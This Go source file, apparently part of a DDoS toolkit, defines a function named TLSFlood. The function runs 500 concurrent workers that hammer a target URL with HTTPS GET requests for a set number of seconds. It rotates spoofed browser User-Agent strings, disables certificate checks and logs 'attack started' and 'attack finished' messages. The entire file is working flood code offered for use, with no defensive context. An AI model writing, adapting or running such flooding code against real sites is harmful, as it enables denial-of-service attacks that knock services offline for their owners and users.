package methods

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"time"
)

// TLSFlood - Standard net/http Flood
func TLSFlood(ctx context.Context, urlStr string, sec int) {
	fmt.Printf("[%s] TLS (Standard) Attack started on %s for %ds\n",
		time.Now().Format("15:04:05"), urlStr, sec)

	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 500,
		DisableCompression:  true,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
	}

	// ctx is passed from caller

	// Standard worker count
	for i := 0; i < 500; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				req, err := http.NewRequest("GET", urlStr, nil)
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", agents[rand.Intn(len(agents))])
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}()
	}
	<-ctx.Done()
	fmt.Printf("[%s] TLS Attack finished.\n", time.Now().Format("15:04:05"))
}
